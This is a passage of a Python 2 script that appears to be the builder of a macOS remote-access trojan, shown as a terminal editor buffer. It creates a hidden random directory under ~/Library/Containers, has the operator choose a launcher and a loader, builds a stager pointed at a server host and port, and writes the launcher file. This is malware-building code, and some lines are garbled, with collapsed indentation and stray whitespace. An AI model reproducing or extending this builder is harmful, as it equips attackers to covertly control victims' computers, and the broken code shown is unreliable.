~/Library/Containers/.%s" % Utils.random_string()                                                                                                               program_directory = random_directory                                                      print MESSAGE_INFO + "Using: %s" % random_directory

    launcher_factory = LauncherFactory()
    loader_factory = LoaderFactory()

    # Prompt the user to select a launcher
    print MESSAGE_INFO + "%s available launchers: " % len(launcher_factory.get_launchers()
)
    for i, (key, launcher) in enumerate(launcher_factory.get_launchers().iteritems()):
        print "%s = %s -> %s" % (str(i), key, launcher.info["Description"])

    while True:
        try:
            launcher_index = raw_input(MESSAGE_INPUT + "Launcher to use [ENTER for 0]: ")

            if not launcher_index:
                launcher_name, launcher = launcher_factory.get_launcher(0)
            else:
                launcher_name, launcher = launcher_factory.get_launcher(int(launcher_index
))

            break
        except ValueError:
            print MESSAGE_ATTENTION + "Invalid launcher."

    # Prompt the user to select a loader
    print MESSAGE_INFO + "%s available loaders: " % len(loader_factory.get_loaders())
    for i, (key, loader) in enumerate(loader_factory.get_loaders().iteritems()):
        print "%s = %s -> %s" % (str(i), key, loader.info["Description"])

    while True:
        try:
            loader_index = raw_input(MESSAGE_INPUT + "Launcher to use [ENTER for 0]: ")
                                                                                                      if not loader_index:                                                                          loader_name, loader = loader_factory.get_loader(0)                                    else:                                                                                         loader_name, loader = loader_factory.get_loader(int(loader_index))

            break
        except ValueError:
            print MESSAGE_ATTENTION + "Invalid loader."

    # Create the launcher
    loader_options = loader.setup()
    stager = create_stager(server_host, server_port, program_directory, loader_name, loader_options)
                                                                                              print MESSAGE_INFO + "Creating \"%s\" launcher..." % launcher_name
    launcher_path = launcher_factory.create_launcher(launcher_name, stager)               
    if launcher_path:                                                                             print MESSAGE_INFO + "Launcher written to: %s" % launcher_path
                                                                                          
if __name__ == '__main__':                                                                    try:
        main()                                                                                except KeyboardInterrupt:
        print "\n" + MESSAGE_INFO + "Interrupted."                                                exit(0)
~
~
~
~
~
